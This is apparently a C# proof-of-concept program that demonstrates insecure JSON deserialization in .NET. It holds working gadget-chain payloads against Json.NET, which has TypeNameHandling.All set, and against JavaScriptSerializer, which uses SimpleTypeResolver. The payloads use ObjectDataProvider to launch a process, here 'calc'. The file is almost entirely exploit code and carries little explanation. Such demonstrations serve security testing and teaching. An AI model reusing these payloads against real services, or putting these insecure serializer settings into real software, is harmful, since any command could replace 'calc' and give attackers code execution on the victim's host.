using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace TestExploitSerializer
{
    public class Test
    {
        public string[] toto;
    }

    class Program
    {
        static void JSonNetExploit()
        {
            var json = @"{""$type"":""System.Windows.Data.ObjectDataProvider,PresentationFramework, Version=4.0.0.0, Culture=neutral,PublicKeyToken=31bf3856ad364e35"",""MethodName"":""Start"",""MethodParameters"":{""$type"":""System.Collections.ArrayList,mscorlib"",""$values"":[""calc""]},""ObjectInstance"":{""$type"":""System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral,PublicKeyToken=b77a5c561934e089""}}";
            var deser = JsonConvert.DeserializeObject(json, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.All,
                //Binder = new WhiteListBinder()
            });
        }

        static void JavaScriptSerializerExploit()
        {
            var json = @"{""__type"":""System.Windows.Data.ObjectDataProvider,PresentationFramework, Version=4.0.0.0, Culture=neutral,PublicKeyToken=31bf3856ad364e35"",""MethodName"":""Start"",""MethodParameters"":[""calc""],""ObjectInstance"":{""__type"":""System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral,PublicKeyToken=b77a5c561934e089""}}";

            var jss = new JavaScriptSerializer(new SimpleTypeResolver());

            var deser = jss.Deserialize<object>(json);
        }

        static void Main(string[] args)
        {
            JSonNetExploit();
            //JavaScriptSerializerExploit();
        }
    }
}
